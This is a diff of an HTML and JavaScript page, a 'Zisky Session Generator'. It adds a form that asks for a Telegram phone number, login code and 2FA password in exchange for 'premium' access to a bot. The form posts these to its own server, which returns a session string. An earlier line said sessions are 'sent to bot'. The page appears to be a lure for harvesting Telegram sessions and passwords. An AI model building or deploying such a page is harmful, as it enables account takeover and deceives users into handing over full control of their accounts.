@@ -25,7 +25,7 @@
             border-radius: 20px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             width: 100%;
-            max-width: 450px;
+            max-width: 500px;
             padding: 30px;
             animation: slideUp 0.5s ease;
         }
@@ -73,6 +73,45 @@
             margin-bottom: 5px;
         }
         
+        .premium-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #856404;
+        }
+        
+        .method-tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #e0e0e0;
+        }
+        
+        .method-tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #666;
+            transition: all 0.3s ease;
+        }
+        
+        .method-tab.active {
+            color: #667eea;
+            border-bottom: 3px solid #667eea;
+        }
+        
+        .method-content {
+            display: none;
+        }
+        
+        .method-content.active {
+            display: block;
+        }
+        
         .form-group {
             margin-bottom: 20px;
         }
@@ -98,6 +137,17 @@
             outline: none;
             border-color: #667eea;
             box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .phone-input {
+            direction: ltr;
+            font-family: monospace;
+        }
+        
+        .code-input {
+            letter-spacing: 2px;
+            font-size: 20px;
+            text-align: center;
         }
         
         .api-input {
@@ -238,58 +288,113 @@
             text-decoration: none;
             font-weight: 600;
         }
+        
+        .premium-note {
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            text-align: center;
+            border: 1px solid #c3e6cb;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🔐 Zisky Session Generator</h1>
-            <p>Get your Telegram session instantly</p>
+            <p>Get your Telegram session for premium access</p>
         </div>
         
-        <div class="step-indicator">
-            <div class="step active" id="step1">
-                <div class="step-number">1</div>
-                <div class="step-label">Enter API Details</div>
-            </div>
-            <div class="step" id="step2">
-                <div class="step-number">2</div>
-                <div class="step-label">Generate Session</div>
-            </div>
-            <div class="step" id="step3">
-                <div class="step-number">3</div>
-                <div class="step-label">Done!</div>
-            </div>
+        <div class="premium-note">
+            ⭐ Enter your Telegram User ID below to get premium in Zisky Ban Bot!
         </div>
         
-        <div class="how-to-box">
-            <strong>📌 How to get your API credentials:</strong>
-            <ol style="margin-top: 8px; margin-left: 20px;">
-                <li>Go to <a href="https://my.telegram.org" target="_blank">my.telegram.org</a></li>
-                <li>Login with your phone number</li>
-                <li>Click "API Development Tools"</li>
-                <li>Copy your <strong>App api_id</strong> and <strong>App api_hash</strong></li>
-            </ol>
+        <!-- User ID Input (Always visible) -->
+        <div class="form-group">
+            <label>🆔 Your Telegram User ID (for premium)</label>
+            <input type="number" id="userId" class="api-input" placeholder="123456789" value="">
+            <small style="color: #999; margin-top: 5px; display: block;">
+                Get your ID from @userinfobot or check your session details
+            </small>
         </div>
         
-        <div id="apiForm">
-            <div class="form-group">
-                <label>🆔 API ID</label>
-                <input type="number" id="apiId" class="api-input" placeholder="1234567">
-                <small style="color: #999; margin-top: 5px; display: block;">From my.telegram.org</small>
+        <!-- Method Tabs -->
+        <div class="method-tabs">
+            <div class="method-tab active" onclick="switchMethod('phone')" id="tabPhone">📱 Phone + Code</div>
+            <div class="method-tab" onclick="switchMethod('api')" id="tabApi">🔑 API ID + Hash</div>
+        </div>
+        
+        <!-- Phone + Code Method -->
+        <div id="methodPhone" class="method-content active">
+            <div class="info-box">
+                <strong>📱 Phone + Code Method</strong>
+                <p>• Enter your phone number with country code<br>• We'll send a verification code<br>• Works for all accounts</p>
             </div>
             
-            <div class="form-group">
-                <label>🔑 API Hash</label>
-                <input type="text" id="apiHash" class="api-input" placeholder="abcdef1234567890abcdef1234567890">
-                <small style="color: #999; margin-top: 5px; display: block;">32 characters, letters and numbers</small>
+            <div id="phoneForm">
+                <div class="form-group">
+                    <label>📱 Phone Number</label>
+                    <input type="tel" id="phone" class="phone-input" placeholder="+1234567890">
+                </div>
+                
+                <button onclick="requestCode()" id="requestBtn">
+                    <span id="btnText">Request Verification Code</span>
+                </button>
             </div>
             
-            <button onclick="generateSession()" id="generateBtn">
-                <span id="btnText">Generate Session String</span>
-            </button>
+            <div id="codeForm" style="display: none;">
+                <div class="form-group">
+                    <label>🔑 Verification Code</label>
+                    <input type="text" id="code" class="code-input" placeholder="12345" maxlength="6">
+                </div>
+                
+                <div class="form-group">
+                    <label>🔐 2FA Password (if enabled)</label>
+                    <input type="password" id="password" placeholder="Leave empty if no 2FA">
+                </div>
+                
+                <button onclick="verifyCode()" id="verifyBtn">Verify & Generate Session</button>
+            </div>
         </div>
         
+        <!-- API ID + Hash Method -->
+        <div id="methodApi" class="method-content">
+            <div class="info-box" style="border-left-color: #ffc107;">
+                <strong>⚠️ API ID + Hash Method</strong>
+                <p>• Works if you're already logged into Telegram on another device<br>• Creates session instantly without SMS<br>• Get credentials from my.telegram.org</p>
+            </div>
+            
+            <div class="how-to-box">
+                <strong>📌 How to get API credentials:</strong>
+                <ol style="margin-top: 8px; margin-left: 20px;">
+                    <li>Go to <a href="https://my.telegram.org" target="_blank">my.telegram.org</a></li>
+                    <li>Login with your phone number</li>
+                    <li>Click "API Development Tools"</li>
+                    <li>Copy your <strong>App api_id</strong> and <strong>App api_hash</strong></li>
+                </ol>
+            </div>
+            
+            <div id="apiForm">
+                <div class="form-group">
+                    <label>🆔 API ID</label>
+                    <input type="number" id="apiId" class="api-input" placeholder="1234567">
+                </div>
+                
+                <div class="form-group">
+                    <label>🔑 API Hash</label>
+                    <input type="text" id="apiHash" class="api-input" placeholder="abcdef1234567890abcdef1234567890">
+                </div>
+                
+                <button onclick="generateSession()" id="generateBtn">
+                    <span id="generateBtnText">Generate Session String</span>
+                </button>
+            </div>
+        </div>
+        
+        <!-- Result Form -->
         <div id="resultForm" style="display: none;">
             <div class="info-box" style="border-left-color: #28a745;">
                 <strong>✅ Session Generated!</strong>
@@ -301,13 +406,13 @@
                 <textarea id="sessionString" rows="4" style="width: 100%; padding: 15px; border: 2px solid #28a745; border-radius: 12px; font-family: monospace; font-size: 12px;" readonly></textarea>
             </div>
             
-            <div style="display: flex; gap: 10px;">
+            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                 <button onclick="copySession()" style="flex: 1; background: #28a745;" id="copyBtn">📋 Copy</button>
                 <button onclick="resetForm()" style="flex: 1; background: #6c757d;">🔄 New Session</button>
             </div>
             
-            <div style="margin-top: 20px; text-align: center;">
-                <small style="color: #999;">Session sent to bot and saved securely</small>
+            <div class="premium-note" style="margin-top: 10px;">
+                ⭐ Premium will be activated for ID: <span id="premiumIdDisplay"></span>
             </div>
         </div>
         
@@ -320,15 +425,134 @@
     </div>
 
     <script>
+        let phoneNumber = '';
+        let currentMethod = 'phone';
+        let userTelegramId = '';
+        
+        function switchMethod(method) {
+            currentMethod = method;
+            
+            // Update tabs
+            document.getElementById('tabPhone').classList.remove('active');
+            document.getElementById('tabApi').classList.remove('active');
+            document.getElementById(`tab${method === 'phone' ? 'Phone' : 'Api'}`).classList.add('active');
+            
+            // Update content
+            document.getElementById('methodPhone').classList.remove('active');
+            document.getElementById('methodApi').classList.remove('active');
+            document.getElementById(`method${method === 'phone' ? 'Phone' : 'Api'}`).classList.add('active');
+        }
+        
         function showStatus(message, type) {
             const status = document.getElementById('status');
             status.className = `status ${type}`;
             status.innerHTML = message;
         }
         
+        // Phone + Code Methods
+        async function requestCode() {
+            phoneNumber = document.getElementById('phone').value;
+            userTelegramId = document.getElementById('userId').value;
+            
+            if (!userTelegramId) {
+                showStatus('❌ Please enter your Telegram User ID for premium', 'error');
+                return;
+            }
+            
+            if (!phoneNumber || !phoneNumber.startsWith('+')) {
+                showStatus('❌ Please enter a valid phone number with country code (e.g., +1234567890)', 'error');
+                return;
+            }
+            
+            const btn = document.getElementById('requestBtn');
+            const btnText = document.getElementById('btnText');
+            btn.disabled = true;
+            btnText.innerHTML = '<span class="loading"></span> Sending code...';
+            
+            try {
+                const response = await fetch('/request-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: phoneNumber,
+                        user_id: parseInt(userTelegramId)
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showStatus('✅ Code sent! Check your Telegram app', 'success');
+                    document.getElementById('phoneForm').style.display = 'none';
+                    document.getElementById('codeForm').style.display = 'block';
+                } else {
+                    showStatus('❌ ' + data.error, 'error');
+                    btn.disabled = false;
+                    btnText.innerHTML = 'Request Verification Code';
+                }
+            } catch (error) {
+                showStatus('❌ Connection error. Please try again.', 'error');
+                btn.disabled = false;
+                btnText.innerHTML = 'Request Verification Code';
+            }
+        }
+        
+        async function verifyCode() {
+            const code = document.getElementById('code').value;
+            const password = document.getElementById('password').value;
+            
+            if (!code) {
+                showStatus('❌ Please enter verification code', 'error');
+                return;
+            }
+            
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> Verifying...';
+            
+            try {
+                const response = await fetch('/verify-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: phoneNumber,
+                        code: code,
+                        password: password,
+                        user_id: parseInt(userTelegramId)
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showStatus('✅ Session generated!', 'success');
+                    document.getElementById('premiumIdDisplay').innerText = userTelegramId;
+                    document.getElementById('sessionString').value = data.session;
+                    document.getElementById('phoneForm').style.display = 'none';
+                    document.getElementById('codeForm').style.display = 'none';
+                    document.getElementById('resultForm').style.display = 'block';
+                } else {
+                    showStatus('❌ ' + data.error, 'error');
+                    btn.disabled = false;
+                    btn.innerHTML = 'Verify & Generate Session';
+                }
+            } catch (error) {
+                showStatus('❌ Verification failed. Please try again.', 'error');
+                btn.disabled = false;
+                btn.innerHTML = 'Verify & Generate Session';
+            }
+        }
+        
+        // API ID + Hash Method
         async function generateSession() {
             const apiId = document.getElementById('apiId').value;
             const apiHash = document.getElementById('apiHash').value;
+            userTelegramId = document.getElementById('userId').value;
+            
+            if (!userTelegramId) {
+                showStatus('❌ Please enter your Telegram User ID for premium', 'error');
+                return;
+            }
             
             if (!apiId || !apiId.match(/^\d+$/)) {
                 showStatus('❌ Please enter a valid API ID (numbers only)', 'error');
@@ -341,7 +565,7 @@
             }
             
             const btn = document.getElementById('generateBtn');
-            const btnText = document.getElementById('btnText');
+            const btnText = document.getElementById('generateBtnText');
             btn.disabled = true;
             btnText.innerHTML = '<span class="loading"></span> Generating session...';
             
@@ -351,7 +575,8 @@
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         api_id: parseInt(apiId),
-                        api_hash: apiHash
+                        api_hash: apiHash,
+                        user_id: parseInt(userTelegramId)
                     })
                 });
                 
@@ -359,20 +584,10 @@
                 
                 if (data.success) {
                     showStatus('✅ Session generated successfully!', 'success');
-                    
-                    // Update step indicator
-                    document.getElementById('step1').classList.remove('active');
-                    document.getElementById('step2').classList.remove('active');
-                    document.getElementById('step3').classList.add('active');
-                    
-                    // Hide API form, show result
+                    document.getElementById('premiumIdDisplay').innerText = userTelegramId;
+                    document.getElementById('sessionString').value = data.session;
                     document.getElementById('apiForm').style.display = 'none';
                     document.getElementById('resultForm').style.display = 'block';
-                    document.getElementById('sessionString').value = data.session;
-                    
-                    btn.disabled = false;
-                    btnText.innerHTML = 'Generate Session String';
-                    
                 } else {
                     showStatus('❌ ' + (data.error || 'Generation failed'), 'error');
                     btn.disabled = false;
@@ -399,19 +614,32 @@
         }
         
         function resetForm() {
+            // Reset all fields
+            document.getElementById('userId').value = '';
+            document.getElementById('phone').value = '';
+            document.getElementById('code').value = '';
+            document.getElementById('password').value = '';
             document.getElementById('apiId').value = '';
             document.getElementById('apiHash').value = '';
+            
+            // Reset displays
+            document.getElementById('phoneForm').style.display = 'block';
+            document.getElementById('codeForm').style.display = 'none';
             document.getElementById('apiForm').style.display = 'block';
             document.getElementById('resultForm').style.display = 'none';
+            
+            // Reset buttons
+            document.getElementById('requestBtn').disabled = false;
+            document.getElementById('btnText').innerHTML = 'Request Verification Code';
+            document.getElementById('generateBtn').disabled = false;
+            document.getElementById('generateBtnText').innerHTML = 'Generate Session String';
+            
+            // Reset status
             document.getElementById('status').className = 'status';
             document.getElementById('status').innerHTML = '';
-            document.getElementById('generateBtn').disabled = false;
-            document.getElementById('btnText').innerHTML = 'Generate Session String';
             
-            // Reset step indicator
-            document.getElementById('step1').classList.add('active');
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step3').classList.remove('active');
+            // Reset to phone method
+            switchMethod('phone');
         }
     </script>
 </body>
